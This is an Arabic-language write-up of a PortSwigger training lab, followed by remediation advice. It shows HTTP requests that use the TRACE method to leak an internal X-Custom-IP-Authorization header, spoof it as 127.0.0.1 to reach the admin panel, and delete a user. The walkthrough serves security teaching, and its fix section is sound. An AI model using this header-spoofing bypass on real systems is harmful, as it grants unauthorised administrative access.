# [Authentication bypass via information disclosure](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass)

## **`الهدف`**
قم بالحصول على اسم الترويسة المطلوبة لتجاوز الـ `authentication` ثم قم بالدخول إلى لوحة الإدارة واحذف المستخدم `Carlos`.
## **`خطوات الحل`**
سنقوم بتحويل طلب الدخول إلى اللاب إلى `Repeater`
```http
GET / HTTP/2
Host: 0a36000304e7310480147619001e0041.web-security-academy.net
Cookie: session=ZMnCnSk7bQfcuSbcq0XKNKg77wjGQWYP
```

ثم سنقوم بإعادة إرساله مرة أخرى باستخدام `TRACE Method`
```http
TRACE / HTTP/2
Host: 0a36000304e7310480147619001e0041.web-security-academy.net
Cookie: session=ZMnCnSk7bQfcuSbcq0XKNKg77wjGQWYP
```

وسنجد أن الاستجابة توضح أنه يتم إضافة ترويسة أخرى من السيرفر `X-Custom-IP-Authorization: 41.46.113.228`
```http
HTTP/2 200 OK
Content-Type: message/http
X-Frame-Options: SAMEORIGIN
Content-Length: 196

TRACE / HTTP/1.1
Host: 0a36000304e7310480147619001e0041.web-security-academy.net
cookie: session=ZMnCnSk7bQfcuSbcq0XKNKg77wjGQWYP
Content-Length: 0
X-Custom-IP-Authorization: 41.46.113.228
```

والأن سنجرب دخول لوحة التحكم
```http
GET /admin HTTP/2
Host: 0a36000304e7310480147619001e0041.web-security-academy.net
Cookie: session=BWDvw7UBYl4Aasowuhwsvwc4bdg76O6q
```

ولكن سنجد في الاستجابة عبارة
`Admin interface only available to local users`

لذلك سنقوم بتجربة إرسال الطلب مرة أخرى ولكن مع وضع ترويسة `X-Custom-Ip-Authorization: 127.0.0.1`
```http
GET /admin HTTP/1.1
Host: 0a36000304e7310480147619001e0041.web-security-academy.net
X-Custom-Ip-Authorization: 127.0.0.1
Cookie: session=BWDvw7UBYl4Aasowuhwsvwc4bdg76O6q
```
وسنجد أنه أصبح لدينا وصول للوحة التحكم، وبفحص الاستجابة سنجد أنه لحذف حساب `carlos` يجب أن نقوم بإرسال طلب إلى مسار `/admin/delete?username=carlos` لننتهي من حل اللاب
```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a36000304e7310480147619001e0041.web-security-academy.net
X-Custom-Ip-Authorization: 127.0.0.1
Cookie: session=BWDvw7UBYl4Aasowuhwsvwc4bdg76O6q
```

## **`ترقيع الثغرة`**
يجب تعطيل الـ `TRACE` وكذلك `TRACK` من إعدادات سيرفر الويب.

ويجب إعداد الـ `Proxy` أو الـ `Load Balancer` ليقوم بحذف أي ترويسة تحمل اسم `X-Custom-IP-Authorization` إذا كانت قادمة من المستخدم، ثم يقوم هو بإنشاء هذه الترويسة من جديد بناءً على الـ `IP` الحقيقي للاتصال.

ويجب أن يمر أي `request` لمسار `/admin` أو أي مسار أو نقطة وصول `(Endpoint)` تقوم بوظائف إدارية عبر `Filter` موجود في الواجهة الخلفية `back-end` ليتحقق من الـ `Session Cookie` الخاص بالمُستخدم، ولكن بشرط صارم وهو أن يكون الـ `Cookie` المُرسل للمُستخدم مجرد `Session ID` عشوائي `Cryptographically Secure Session ID`، يتم توليده باستخدام دالة عشوائية آمنة تشفيرياً لمنع أى عمليات توقع أو تخمين من المُهاجم، 

ويجب حماية هذا الـ `Cookie` بتفعيل خصائص الأمان مثل `HttpOnly` لمنع سرقته عبر ثغرات الـ `XSS`، وخاصية `Secure` لضمان تشفيره عبر `HTTPS`، وخاصية `SameSite=Strict` أو `SameSite=Lax` لمنع هجمات الـ `CSRF`، حيث تضمن هذه الخاصية أن المتصفح لن يقوم بإرسال `cookie` الجلسة مع أي طلبات خارجية قادمة من مواقع أخرى، مما يحمي لوحة التحكم من التنفيذ التلقائي للأوامر الحساسة. 

ويتم ربط المُستخدم بالـ `Session ID` بشكل صارم في الواجهة الخلفية `back-end` ليستطيع السيرفر معرفة الـ `Role` الحقيقي للمٌستخدم، وإذا لم يكن الـ `Role` الخاص بالمُستخدم يخوله للدخول إلى مسار `/admin`، فيتم رفض الـ `request` فورًا بـ `403 Forbidden` إذا كان مُسجل دخول بالفعل ولكنه مُستخدم عادي، أو `401 Unauthorized` إذا لم يمكن مُسجل دخول من الأساس، وليس مجرد عمل إعادة توجيه.

وكخطوة أمان إضافية، عندما يضعط أحد على حذف حساب أى مُستخدم يٌمكن جعل السيرفر يتحقق مرة أخرى من صلاحية حذف المُستخدمين، لأن وصوله للصفحة لا يعنى أنه مخول بجميع الصلاحيات.

وهناك خطوتين اختياريتين قد لا يكونوا متاحين للجميع بسبب طبيعة العمل لذلك الأمر متروك لكم: أولًا تغيير مسار `/admin` إلى مسار عشوائي وغير متوقع لجعل الوصول له أكثر صعوبة `(Hardening)`، ثانيًا: عزل لوحة التحكم بحيث لا تكون متاحة للإنترنت الخارجي، ويقتصر الدخول على الـ `IP` الخاص بالشركة (الانترنت الداخلي فقط)، أو عزل لوحة التحكم بالـ `IP (White-listing).`
